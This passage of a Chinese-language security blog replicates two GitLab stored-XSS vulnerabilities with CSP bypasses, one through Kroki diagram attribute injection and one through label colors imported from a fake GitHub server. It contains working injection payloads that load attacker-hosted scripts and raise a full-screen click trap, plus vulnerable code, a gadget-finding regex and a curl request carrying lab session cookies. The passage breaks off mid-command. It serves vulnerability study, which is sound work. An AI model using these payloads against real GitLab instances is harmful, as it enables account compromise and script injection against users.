+<p>gitlab markdown 编辑器接受 html、md 和其他语言的输入和相互转换，并对其进行相应的渲染。本漏洞接受的是 kroki 图表的 html 输入，但是处理该输入时，没有对 html 标签的属性进行适当过滤，从而嵌入渲染后的 html 中，造成 html 属性注入。结合前端属性选择器漏洞，可以绕过 csp 注入 xss。
+<em>lib/banzai/filter/kroki_filter.rb</em></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>img_tag = Nokogiri::HTML::DocumentFragment.parse(%(&lt;img src="#{image_src}" /&gt;))
+</code></pre></div></div>
+
+<p>这里对用户字符串的处理用了 ruby 的<code class="language-plaintext highlighter-rouge">%()</code>语法，等同于<code class="language-plaintext highlighter-rouge">%Q()</code>，改语法相当于构造字符串，但是相较于双引号包裹”“，<code class="language-plaintext highlighter-rouge">%()</code>不用对内部的引号进行转义，很方便。
+另一种是 heredoc 多行文字表示法。</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;&lt;HEREDOC
+…
+HEREDOC
+
+&lt;&lt;-HEREDOC (表示结尾标识前可以有空格)
+…
+HEREDOC
+
+&lt;&lt;~HEREDOC (表示忽略换行前面的空格)
+…
+HEREDOC
+
+甚至能执行shell code，用反引号标识
+ str = &lt;&lt;~`HEREDOC`
+        date
+  HEREDOC
+=&gt; "Wed Mar 25 18:51:08 IST 2020\n"
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">%()</code> <code class="language-plaintext highlighter-rouge">%Q()</code> <code class="language-plaintext highlighter-rouge">heredoc</code>引入变量的方法都是<code class="language-plaintext highlighter-rouge">#{变量名}</code></p>
+
+<h4 id="code-review">Code Review</h4>
+
+<ol>
+  <li>
+    <p>通过 drawio 画出<a href="https://drive.google.com/file/d/1RuaQELwDr-kQDS1XHNpDNi8Xh7EQ4WZI/view?usp=sharing">函数流关系图</a>。找到部分触发该漏洞函数的 controller。</p>
+
+    <p>在寻找 source 的过程中，进行数据流分析，从而确定数据源头。因为函数 source 未必是数据 source，在复杂应用下两者是一种间接的关系。
+数据流向上分析可以在函数流的基础上，因为大部分都是函数传参的形式。
+在分析的过程中失误了一下，导致把可能的选项排除掉了，还是要仔细一点。
+主要是数据流向太多了，分析不过来，只能通过正向分析和逆向分析，加推断来分析。</p>
+  </li>
+  <li>首先通过逆向函数流分析定位到了 Pipeline 模块，它的所有子类都可以通过该模块的下标方法进行访问。
+<em>lib/banzai/pipeline.rb</em>
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Pipeline[nil] # =&gt; Banzai::Pipeline::FullPipeline
+Pipeline[:label] # =&gt; Banzai::Pipeline::LabelPipeline
+</code></pre></div>    </div>
+    <p>当下标为空，那么默认返回 Fullpipeline，这里有所有的过滤器，包含了漏洞函数所在的过滤器</p>
+  </li>
+  <li>
+    <p>而在审计代码时，发现函数传参时，会传递<code class="language-plaintext highlighter-rouge">pipeline: :label</code>这样的形式传递，因此向直接正向分析来定位哪里传递了该参数。</p>
+
+    <p><img src="/assets/gitlab/1/pipeline.png" alt="pipeline" /></p>
+
+    <p>可以看到模型中也定义了该属性，例如 attr_mentionable: note, pipeline: :note</p>
+
+    <p>对应 NotePipeline，该 pipeline 继承自 FullPipeline</p>
+  </li>
+  <li>
+    <p>从 note 模型出发，看看该 pipeline 怎么使用的。定位到 notes_controller，发现该 controller 类没有 new 相关实现，于是直接搜索 Note.new 实例化的地方。</p>
+
+    <p><img src="/assets/gitlab/1/note_new.png" alt="note_new" /></p>
+
+    <p><img src="/assets/gitlab/1/snippet.png" alt="snippet" /></p>
+
+    <p>直接定位到 snippets_controller，会生成 note，因此找到该 controller 的路由。</p>
+  </li>
+  <li>
+    <p>无意中找到开发者模式下，rails 提供路由信息的页面为：<code class="language-plaintext highlighter-rouge">http://10.206.44.20:8830/rails/info/routes</code>
+路由文件为：<em>config/routes/development.rb</em></p>
+  </li>
+  <li>
+    <p>因此直接寻找 snippets 关键字。</p>
+
+    <p><img src="/assets/gitlab/1/snppet_router.png" alt="snppet_router" /></p>
+
+    <p>找到了 snippets 的路由，直接在浏览器打开，进入到生成路由界面。</p>
+  </li>
+  <li>
+    <p>进入路由页面，例如：<code class="language-plaintext highlighter-rouge">http://10.206.44.19:8830/-/snippets/16</code>。</p>
+
+    <p>输入 payload 为：<code class="language-plaintext highlighter-rouge">&lt;pre lang='/"onerror=alert();//'&gt;&lt;code lang='wavedrom'&gt;&lt;/code&gt;&lt;/pre&gt;</code></p>
+
+    <p>可以看到<code class="language-plaintext highlighter-rouge">lang</code>属性的值注入了双引号和 onerror 属性。提交 payload 后，后端返回渲染片段，<strong>注入属性成功，但是 csp 阻止 xss 执行</strong>。</p>
+  </li>
+  <li>
+    <p>如果绕过 csp，既然可以注入某些属性，那么考虑是否可以注入 class 属性以及 data 属性，然后寻找前端 jquery 初始化的 gadget，通过属性值输入 xss:</p>
+
+    <p><img src="/assets/gitlab/1/jquerysearch.png" alt="jquerysearch" /></p>
+
+    <p>可以看到，包含 jQuery 的文件有 179 个，一天看 10 个，半个月可以看完，也不是很难。</p>
+  </li>
+  <li>
+    <p>由于 gitlab 是 rails 后端和 vue 前端同时渲染，如何定位到 vue 前端的位置呢？官网给出了解释：</p>
+
+    <p><a href="https://docs.gitlab.com/ee/development/fe_guide/performance.html#page-specific-javascript">引用</a>
+Webpack has been configured to automatically generate entry point bundles based on the file structure in app/assets/javascripts/pages/*. The directories in the pages directory correspond to Rails controllers and actions. These auto-generated bundles are automatically included on the corresponding pages.
+For example, if you were to visit https://gitlab.com/gitlab-org/gitlab/-/issues, you would be accessing the app/controllers/projects/issues_controller.rb controller with the index action. If a corresponding file exists at pages/projects/issues/index/index.js, it is compiled into a webpack bundle and included on the page.
+When unsure what controller and action corresponds to a page, inspect document.body.dataset.page in your browser’s developer console from any page in GitLab.</p>
+
+    <p><img src="/assets/gitlab/1/vuejs.png" alt="vuejs" /></p>
+
+    <p>即根据后端目录结构来加载相应的 vue app。另外，也可以在页面前端通过<code class="language-plaintext highlighter-rouge">document.body.dataset.page</code>返回 js 加载的路径.</p>
+  </li>
+  <li>
+    <p>看看攻击者如何绕过 csp。攻击者提示，找到 single_file_diff.js 文件，并且依据上一步找到该 js 文件加载的页面：</p>
+
+    <p>例如：<em>http://10.206.44.19:8830/gitlab-org/gitlab-shell/-/commit/8626f758a5e9cf532c4474d79d52ad540c7d091d?view=parallel</em></p>
+
+    <p>尝试注入 payload：<code class="language-plaintext highlighter-rouge">&lt;pre lang='"&gt;&lt;div&gt;hello&lt;/div&gt;&lt;/img&gt;&lt;img  '&gt;&lt;code lang='wavedrom'&gt;&lt;/code&gt;&lt;/pre&gt;</code></p>
+
+    <p>这里 pre 的 lang 设置为了想要注入的 html code，但是调试到后端发现：</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>img_tag = Nokogiri::HTML::DocumentFragment.parse(%(&lt;img src="#{image_src}" /&gt;))
+img_tag = img_tag.children.first
+</code></pre></div>    </div>
+
+    <p>漏洞点位的下一行对 img_tag 进行了处理，只会取第一个碰到的元素，那就是 img 元素，尝试将 html 注入到 img 标签内,但是 image 不接收子元素，于是注入失败，只能注入属性。尝试注入 class 属性，发现:</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>img_tag.set_attribute('class', 'js-render-kroki')
+</code></pre></div>    </div>
+
+    <p>后面的代码对 class 属性进行了覆盖，因此 class 属性注入也失败。看了攻击者的 payload，发现他没有刻意注入 class 元素，为什么呢？因为他利用页面上已经有 class，只需要保证注入的属性在该 class 的子元素中即可。</p>
+  </li>
+  <li>
+    <p>分析何处调用 single<em>file_diff.js，定位到：
+_app/assets/javascripts/pages/projects/commit/show/index.js</em></p>
+
+    <p><img src="/assets/gitlab/1/newdiff.png" alt="newdiff" /></p>
+
+    <p><em>app/assets/javascripts/single_file_diff.js</em></p>
+
+    <p><img src="/assets/gitlab/1/single_file_diff.png" alt="single_file_diff" /></p>
+
+    <p>可以看到，diffForPath 是 data 属性，该 gadget 读取该属性为链接，并且下载内容，直接通过 jquery 进行渲染。</p>
+  </li>
+  <li>
+    <p>因此构造 payload 为：</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;pre lang='" data-diff-for-path="http://10.206.44.19:8830/gnuwget/Wget2/-/raw/master/xss.json"  '&gt;&lt;code lang='wavedrom'&gt;&lt;/code&gt;&lt;/pre&gt;
+</code></pre></div>    </div>
+
+    <p>其中 <em>http://10.206.44.19:8830/gnuwget/Wget2/-/raw/master/xss.json</em> 是我们自己上传的 json 文件，包含了 xss payload。</p>
+
+    <p><img src="/assets/gitlab/1/Krokixss.png" alt="Krokixss" /></p>
+  </li>
+  <li>
+    <p>触发上述 xss 需要点击按钮，因此攻击者又进一步将该按钮全屏化，只要点击页面任何位置就可以触发，这一步需要注入 style 样式。</p>
+
+    <ul>
+      <li>首先注入 style 属性，首先更改本 img 样式，为最大并且覆盖在页面上
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>id=stage1 style="position:absolute;max-width:10000px;left:-1000px;top:-1000px;width:10000px;height:10000px;z-index:10000;"
+</code></pre></div>        </div>
+      </li>
+      <li>然后注入 3 个 data 属性
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>data-triggers="click" data-toggle=popover data-html=true
+</code></pre></div>        </div>
+      </li>
+      <li>
+        <p>其中<code class="language-plaintext highlighter-rouge">data-toggle</code>和<code class="language-plaintext highlighter-rouge">data-html</code>属性将本元素定义为下拉菜单。由 vue app 负责页面初始化时进行扫描并且转换。搜索关键字： <code class="language-plaintext highlighter-rouge">data-toggle="popover</code> ，找到一处引用:
+<em>app/assets/javascripts/popovers/index.js</em></p>
+
+        <p><img src="/assets/gitlab/1/popover.png" alt="popover" /></p>
+
+        <p>经过简单分析，该类会在网页初始化时自动执行，并且对所有包含 data-toggle 属性的元素进行 popover 下拉菜单构建。这个潜在的漏洞点已经碰到多次。因此就好办了，对于任何用属性作为选择器来操作元素的代码，是极其不安全的。并且这个漏洞点还有一点就是 data 属性的值配合 vue 的 v-html 或者 v-safe-html 来实现</p>
+      </li>
+      <li><code class="language-plaintext highlighter-rouge">data-triggers</code>也是负责下拉菜单的初始化。由于 gitlab 项目中搜索 triggers 关键字（vue 会去掉 data 前缀）没有任何收获，于是去掉该属性后发现 Trigger 不了，就是 popover 并不会出现，即使构造了 popover app。由于目标元素（img）会传递给 GlPopover 组件，该组件在 gitlab-ui 依赖中于是在 gitlab-ui 项目寻找，发现了该属性的使用。也就是说不能删除该属性。删除之后 popover 触发不了，所以不会挂载到 document 中。也就是所，组件的初始化和是否挂载到 document 是两回事。经过测试，click 和 hover 都能够触发挂载，但是 click 更稳定，而 hover 会不断触发挂载和移除，不够稳定想想也是，既然是下来菜单，需要点击或者 hover 才会渲染出现。
+参考：<a href="https://gitlab.com/gitlab-org/gitlab-ui/-/blob/main/src/components/base/popover/popover.vue">https://gitlab.com/gitlab-org/gitlab-ui/-/blob/main/src/components/base/popover/popover.vue</a></li>
+      <li>和最后两个 data 属性，主要更改了按钮类 svg.chevron-right 的属性让其覆盖在所有元素之上。
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>data-title="aaa&amp;lt;style&amp;gt;#stage1{pointer-events:none}svg.chevron-right{position:absolute;max-width:10000px;left:-1000px;top:-1000px !important;width:10000px;height:10000px;z-index:10001;}&amp;lt;/style&amp;gt;bbb"
+data-content=ggg
+</code></pre></div>        </div>
+        <p>data-title 和 data-content 的值都会传入 v-safe-html 进行渲染，这里就可以改变目标元素的 css。让任意元素铺满屏幕等待用户点击触发。
+<em>app/assets/javascripts/popovers/components/popovers.vue</em></p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;template&gt;
+  &lt;div&gt;
+    &lt;gl-popover v-for="(popover, index) in popovers" :key="index" v-bind="popover"&gt;
+      &lt;template #title&gt;
+        &lt;span v-if="popover.html" v-safe-html:[$options.safeHtmlConfig]="popover.title"&gt;&lt;/span&gt;
+        &lt;span v-else&gt;&lt;/span&gt;
+      &lt;/template&gt;
+      &lt;span v-if="popover.html" v-safe-html:[$options.safeHtmlConfig]="popover.content"&gt;&lt;/span&gt;
+      &lt;span v-else&gt;&lt;/span&gt;
+    &lt;/gl-popover&gt;
+  &lt;/div&gt;
+&lt;/template&gt;
+</code></pre></div>        </div>
+        <p>注意 vue 中的 data 属性不带 data 字样，例如：
+<em>app/assets/javascripts/popovers/components/popovers.vue</em></p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>const { content, html, placement, title, triggers = 'focus' } = element.dataset;
+</code></pre></div>        </div>
+      </li>
+    </ul>
+  </li>
+</ol>
+
+<h4 id="tips">Tips</h4>
+
+<p>该漏洞存在三个漏洞进行串联</p>
+
+<ol>
+  <li>首先是前端接受用户输入的 html 代码。如果没有后端代码，怎么知道需要注入 pre-&gt;code 这样的标签呢。</li>
+  <li>接着后端对该 html 代码处理时，未对属性值进行过滤导致可以逃出引号注入部分属性。</li>
+  <li>再是 csp 绕过，前端利用属性作为选择器，从而获取用户输入的属性值，并且处理后进行渲染，结合 jquery script 绕过。注意，之前我还在找注入 class 类引发 gadget，但是这个例子说明了特定属性也可以。
+    <ul>
+      <li>在特定页面（具体来说是特定 class 下）注入特定属性，无所谓属性所在的标签是什么</li>
+      <li>前端直接使用特定属性作为选择器，从而构造特定属性值。</li>
+    </ul>
+  </li>
+  <li>最后是提升触发程度，同样是前端利用属性作为选择器，从而注入特定属性，利用 data 属性和 vue v-html 来注入 style 从而改变任意元素的样式。
+    <ul>
+      <li>有全局初始化 vue app 或者说初始化 js 代码，它们用特定属性作为选择器，从而构造某些组件，例如 tooltip 或者 popover</li>
+      <li>同时注入特定属性，拦截网页初始化阶段，从而注入特定 html 或者 style，改变页面结构更容易诱发用户点击等</li>
+    </ul>
+  </li>
+  <li>注意，事件例如 click 绑定在某一元素中，那么该所有的所有子元素都可以触发该事件.</li>
+</ol>]]></content><author><name></name></author><category term="xss" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Replication: Gitlab Stored-XSS with CSP-bypass via labels’ color</title><link href="http://localhost:4000/xss/2023/11/15/csp-bypass-xss-label-color.html" rel="alternate" type="text/html" title="Replication: Gitlab Stored-XSS with CSP-bypass via labels’ color" /><published>2023-11-15T10:31:06+08:00</published><updated>2023-11-15T10:31:06+08:00</updated><id>http://localhost:4000/xss/2023/11/15/csp-bypass-xss-label-color</id><content type="html" xml:base="http://localhost:4000/xss/2023/11/15/csp-bypass-xss-label-color.html"><![CDATA[<h2 id="name">Name</h2>
+
+<blockquote>
+  <p>Stored-XSS with CSP-bypass via labels’ color</p>
+</blockquote>
+
+<h2 id="weakness">Weakness</h2>
+
+<blockquote>
+  <p>XSS</p>
+</blockquote>
+
+<h2 id="severity">Severity</h2>
+
+<blockquote>
+  <p>高危</p>
+</blockquote>
+
+<h2 id="environment">Environment</h2>
+
+<blockquote>
+  <p>gitlab 版本：14.5.2-ee</p>
+</blockquote>
+
+<blockquote>
+  <p>原文：<a href="https://hackerone.com/reports/1665658">https://hackerone.com/reports/1665658</a></p>
+</blockquote>
+
+<h2 id="url">URL</h2>
+
+<h2 id="summary">Summary</h2>
+
+<p>gitlab 导入外部 github 仓库数据，并且未对数据进行过滤，导致后端渲染时 xss。伪造 github 服务器，返回 xss payload，后端渲染的时候没有对引号进行处理，导致新的标签/属性可以插入。如下，<code class="language-plaintext highlighter-rouge">bg_color</code>字段没有进行过滤。这是后端渲染的问题，xss 在后端模板被注入</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def render_label_text(name, suffix: '', css_class: nil, bg_color: nil)
+  &lt;&lt;~HTML.chomp.html_safe
+    &lt;span
+      class="#{css_class}"
+      data-container="body"
+      data-html="true"
+      #{"style=\"background-color: #{bg_color}\"" if bg_color}
+    &gt;#{ERB::Util.html_escape_once(name)}#{suffix}&lt;/span&gt;
+  HTML
+end
+</code></pre></div></div>
+
+<h4 id="code-review">Code Review</h4>
+
+<h5 id="基于函数流分析">基于函数流分析</h5>
+
+<ol>
+  <li>首先定位到漏洞代码：
+<em>gitlab/app/helpers/labels_helper.rb#266</em>
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def render_label_text(name, suffix: '', css_class: nil, bg_color: nil)
+  &lt;&lt;~HTML.chomp.html_safe
+    &lt;span
+      class="#{css_class}"
+      data-container="body"
+      data-html="true"
+      #{"style=\"background-color: #{bg_color}\"" if bg_color}
+    &gt;#{ERB::Util.html_escape_once(name)}#{suffix}&lt;/span&gt;
+  HTML
+end
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>然后定位到该文件中调用该函数的两个函数，分别是 link<em>to_label 和 render_label，他们的第一个参数 label 包含了漏洞数据：
+_gitlab/app/helpers/labels_helper.rb#39</em></p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def link_to_label(label, type: :issue, tooltip: true, small: false, css_class: nil, &amp;block)
+  render_label(label, link: link, tooltip: tooltip, small: small)
+
+end
+def render_label(label, link: nil, tooltip: true, dataset: nil, small: false)
+  html = render_colored_label(label)
+end
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>首先分析 render_label 函数，引用该函数进行数据渲染的地方都是模板文件，一共有三处，这三处都是 shared view：</p>
+
+    <p><em>gitlab/app/views/shared/_label_row.html.haml</em>
+<em>gitlab/app/views/shared/milestones/_issuable.html.haml</em>
+<em>gitlab/app/views/shared/milestones/_labels_tab.html.haml</em></p>
+  </li>
+  <li>先分析第一处，旁边的_label.html.haml 引用该模板，则搜索<code class="language-plaintext highlighter-rouge">shared/label</code>关键字
+<em>gitlab/app/views/shared/_label.html.haml#10</em>
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>%li.label-list-item{ id: label_css_id, data: { id: label.id } }
+    = render "shared/label_row", label: label, force_priority: force_priority
+    %ul.label-actions-list
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>找到一处引用该模板的文件，那么 projects labels 就是路由了，进去可以看到渲染结果：
+<em>gitlab/app/views/projects/labels/index.html.haml</em></p>
+
+    <p><img src="/assets/gitlab/1/labels.png" alt="labels" /></p>
+
+    <p>渲染的 bg_color:</p>
+
+    <p><img src="/assets/gitlab/1/bg_color.png" alt="bg_color" /></p>
+  </li>
+  <li>但是新建 label 时，后端对 label 的 color 做了 valid 校验，填入非 color 会报错无法插入数据库。因此攻击者想到 bulk<em>insert，该方法可以绕过校验直接插入数据库。刚好 github_import 提供 label 的 bulk_insert 功能。怎么会想到该功能呢？并且刚好有 label 模型使用该方法插入数据呢？难道这就是碰运气吗？还是说对项目的全面理解。假设我们已经找到 label 存在 bulk_insert，其位置在类 LabelsImporter 中。复现完后，我想可能是攻击者首先对 api 进行检查，当看到 import 接口可以设置自定义的域名后，就开始从头分析，而非逆向分析。因为这种导入接口大概率存在漏洞。正向分析的过程中，检查这个接口都导入了什么资源，而且检查这些资源的渲染方式，从而定位到了漏洞。
+_gitlab/lib/gitlab/github_import/importer/labels_importer.rb#16</em>
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def execute
+  bulk_insert(Label, build_labels)
+  build_labels_cache
+end
+</code></pre></div>    </div>
+  </li>
+  <li>注意到该攻击还绕过了 csp，绕过 csp 的方式是<code class="language-plaintext highlighter-rouge">jquery+&lt;script&gt;tag</code>，只有在渲染<code class="language-plaintext highlighter-rouge">&lt;script&gt;</code>标签可以绕过，其他的例如 onerror 不行，经过测试利用该漏洞能够绕过 script-src self csp，简直无敌。
+<em>gitlab/app/assets/javascripts/projects/settings/access_dropdown.js#507</em>
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>renderRow(item) {
+    let criteria = {};
+    let groupRowEl;
+    switch (item.type) {
+      case LEVEL_TYPES.DEPLOY_KEY:
+        groupRowEl =
+          this.accessLevel === ACCESS_LEVELS.PUSH ? this.deployKeyRowHtml(item, isActive) : '';
+        break;
+    }
+    return groupRowEl;
+  }
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>csp:</p>
+
+    <p><strong>Self</strong>: 仅仅执行同域名的 js 文件，所有 event handler 和<code class="language-plaintext highlighter-rouge">&lt;script&gt;&lt;/script&gt;</code>内的代码都不执行。<code class="language-plaintext highlighter-rouge">Jquery+&lt;script&gt;</code>标签可绕过
+<strong>Unsafe-inline</strong>: 所有 event handler 和<code class="language-plaintext highlighter-rouge">&lt;script&gt;&lt;/script&gt;</code>内的代码可以执行，但是出现 either a hash or nonce value，该条失效，就是说若存在’nonce-xxx’，那么 unsafe-inline 无效，event handler 和<code class="language-plaintext highlighter-rouge">&lt;script&gt;</code>内部代码都不执行。<code class="language-plaintext highlighter-rouge">Jquery+&lt;script&gt;</code>标签可绕过</p>
+  </li>
+  <li>其中 csp 绕过的 jquery 代码如下：
+<em>app/assets/javascripts/gl_field_error.js#66</em>
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>constructor({ input, formErrors }) {
+  this.inputElement = $(input);
+  this.inputDomElement = this.inputElement.get(0);
+  this.form = formErrors;
+  this.errorMessage = this.inputElement.attr('title') || __('This field is required.');
+  this.fieldErrorElement = $(`&lt;p class='${errorMessageClass} hidden'&gt;${this.errorMessage}&lt;/p&gt;`);
+  this.state = {
+    valid: false,
+    empty: true,
+    submitted: false,
+  };
+  this.initFieldValidation();
+}
+</code></pre></div>    </div>
+    <p>可以看到<code class="language-plaintext highlighter-rouge">${this.errorMessage}</code>没有过滤直接嵌入 jquery 元素中，该处也可以形成一个 regex，该代码在整个 gitlab 源码中只匹配到了上面片段：</p>
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>\$\([`\x27"][\s\S]{0,100}?&lt;[\s\S]{3,200}?&gt;[\s\S]{0,100}?[`\x27"]\)
+</code></pre></div>    </div>
+    <p>注意在 linux command 中，<code class="language-plaintext highlighter-rouge">'</code>需要 escape，方法是\x27 代替单引号，\x22 代替双引号，下面的双引号其实不需要 escape，例如，参考：<a href="https://stackoverflow.com/a/65878993">https://stackoverflow.com/a/65878993</a></p>
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python ~/zero/DirBrute/findRegexInDir.py -d ~/discourse -f "\.js$" -r '\$\([`\x27\x22"]&lt;[\s\S]{3,200}?&gt;[`\x27\x22]\)' -n 'node_modules|test.js|spec.js'
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>下面是负责导入 github 的后端 api 类，找到 github client，搜索 GithubImport::Client.new 来定位该类实例化的位置，可以找到两个位置，分别是：
+<em>app/controllers/import/github_controller.rb</em>
+<em>lib/api/import_github.rb</em></p>
+
+    <p><img src="/assets/gitlab/1/import_github.png" alt="import_github" /></p>
+
+    <p>其中 github<em>controller 中，host 无法被修改，因此默认为 github 的 api：
+_app/controllers/import/github_controller.rb#108</em></p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def client
+    @client ||= if Feature.enabled?(:remove_legacy_github_client)
+                Gitlab::GithubImport::Client.new(session[access_token_key])
+            else
+                Gitlab::LegacyGithubImport::Client.new(session[access_token_key], **client_options)
+            end
+end
+</code></pre></div>    </div>
+
+    <p>而 import<em>github.rb 中 host 可以修改，因此可以控制:
+_lib/api/import_github.rb#14</em></p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def client
+    @client ||= if Feature.enabled?(:remove_legacy_github_client)
+                Gitlab::GithubImport::Client.new(params[:personal_access_token], host: params[:github_hostname])
+            else
+                Gitlab::LegacyGithubImport::Client.new(params[:personal_access_token], client_options)
+            end
+end
+</code></pre></div>    </div>
+
+    <p>注意到，只能通过 github 来导入，如果选择用 git 或者其他方式导入，那么不会导入 labels。</p>
+  </li>
+  <li>
+    <p>经过分析 import_github.rb 是 grape 构建的 api 接口，可以通过/v4/api 访问调用，参考：
+<a href="https://github.com/ruby-grape/grape">https://github.com/ruby-grape/grape</a></p>
+
+    <p><em>lib/api/api.rb</em>
+<em>config/routes/api.rb</em>
+<em>config/routes.rb#273</em>
+最终被 mount 挂载到主路由文件中</p>
+  </li>
+  <li>
+    <p>导入测试，需要伪造一个假 github 服务器。首先通过导入正常的 github 仓库，并且对 gitlab 后端进行抓包，从而查看 gitlab 如何与 github 交互。</p>
+  </li>
+  <li>
+    <p>首先在 gitlab 所在的 Ubuntu 服务器上安装 burpsuite 证书，参考<a href="https://ubuntu.com/server/docs/security-trust-store">该链接</a>，安装 burpsuite 证书到系统 ca 根目录。然后设置终端 http_proxy 和 https_proxy 系统变量为 windows host 的 burpsuite 端口。启动 gitlab 服务后，rails 自动使用该代理。设置后，从 github 导入项目时，后端发送的请求就能够通过 burp 拦截。</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>export https_proxy=http://10.15.0.147:8085
+export http_proxy=http://10.15.0.147:8085
+</code></pre></div>    </div>
+
+    <p><img src="/assets/gitlab/1/import1.png" alt="import1" /></p>
+
+    <p><img src="/assets/gitlab/1/import2.png" alt="import2" /></p>
+  </li>
+  <li>
+    <p>伪造 fake github server，需要一个公网服务器，并且在该服务器上安装 gitea 以便 gitlab 能导入仓库数据。node server 代码如下：</p>
+
+    <p><a href="vscode-local:/c%3A/Users/11593/AppData/Local/Temp/OneNote/16.0/Exported/%7B2E4B8080-29FE-40E1-B921-B593FF5E3AE4%7D/NNT/0/rb.zip">github fake server</a></p>
+
+    <p><strong>gitea 配置</strong></p>
+
+    <p>伪造的服务器需要配置 gitea 服务，并且需要和伪造请求中的 git 地址一样，这样 gitlab 会从伪造的服务器拉取代码和后续 labels 请求，否则还是会去 github 拉取。gitea 默认开启在 3000 端口，但是可通过 nginx proxy 代理到 80 端口，这一步是必要的。</p>
+  </li>
+  <li>
+    <p>fake github server 配置完成后，直接调用 gitlab 提供的 api 进行导入操作：</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl --location 'http://127.0.0.1:3000/api/v4/import/github' \
+--header 'Accept: application/json, text/plain, */*' \
+--header 'Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,ja-JP;q=0.6,ja;q=0.5' \
+--header 'Cache-Control: no-cache' \
+--header 'Connection: keep-alive' \
+--header 'Cookie: perf_bar_enabled=true; preferred_language=en; hide_auto_devops_implicitly_enabled_banner_8=false; visitor_id=ae1ea916-faeb-458b-a6fe-e823e28e4946; frequently_used_emojis=smile%2Csmiley%2Cblush%2Cflag_wf%2Cman_dancing_tone3%2Cman_dancing_tone1; experimentation_subject_id=eyJfcmFpbHMiOnsibWVzc2FnZSI6IklqTmlOVE0zWkRnMExXWm1ZV0V0TkRrd1pTMDVORGswTFRJell6VTVaalJqWmpjek15ST0iLCJleHAiOm51bGwsInB1ciI6ImNvb2tpZS5leHBlcmltZW50YXRpb25fc3ViamVjdF9pZCJ9fQ%3D%3D--e03f99e2fe31888f17b1a38192c53e1a7c6eebe7; sidebar_collapsed=false; BetterErrors-2.9.1-CSRF-Token=7ebd9970-0ce3-4b4f-b4d6-0a96114c3c57; known_sign_in=cC9DbkxsUmZZVG1EeGZ3bGhlQmVXQlVqWnVKQ2k1aklucEc1QmpXTjQrUTBYQ2M1c2l4K0J4czRxclRVekNmZmFSeVRKaGduYzJ4eEQxa2ZRUmhzWEdZeXV0VTdyd21pMnlkd3ltdExOYWlEeHVDUlNwMjdvTEVKQWNvaFZGdFotLS9TNTRJc3gwWEdtRTYxamFOWmhUU3c9PQ%3D%3D--33ef27c41f5b2d1b3b3f81b201525cb25ad31280; hide_auto_devops_implicitly_enabled_banner_6=false; event_filter=push; remember_user_token=eyJfcmFpbHMiOnsibWVzc2FnZSI6Ilcxc3hYU3dpSkRKaEpERXdKRWR6TjNCbWJIaERiM2hYYW1WelpFcEVMakppTnk0aUxDSXhOekF3TmpFMk56VXdMakU0TURVeE5ETWlYUT09IiwiZXhwIjoiMjAyMy0xMi0wNlQwMTozMjozMC4xODBaIiwicHVyIjoiY29va2llLnJlbWVtYmVyX3VzZXJfdG9rZW4ifX0%3D--d9f8a3d3facd1ae216b64bae4390ee38fd8cd5e2; _gitlab_session_07baa7241726843883bf7ec3444d875952c2c2a722793cb27890cede722617b2=bbe97137c1f77a28d631400fc209d6b4; _gitlab_session_07baa7241726843883bf7ec3444d875952c2c2a722793cb27890cede722617b2=42172205f2e8b1d7619454840d139af6' \
+--header 'Pragma: no-cache' \
+--header 'Referer: http://127.0.0.1:3000/root/final5' \
+--header 'Sec-Fetch-Dest: empty' \
+--header 'Sec-Fetch-Mode: cors' \
+--header 'Sec-Fetch-Site: same-origin' \
+--header 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36' \
+--header 'X-CSRF-Token: gmIiPkGG+9ZjV7zsBfslb4QjfYZSFDSszxzQy2/+RcfCFZtow6G8uogwP2lpmW4PIWuywI71kwZ5Ezvbw802/g==' \
+--header 'X-Requested-With: XMLHttpRequest' \
+--header 'sec-ch-ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"' \
+--header 'sec-ch-ua-mobile: ?0' \
+--header 'sec-ch-ua-platform: "Windows"' \
+--header 'Content-Type: application/json' \
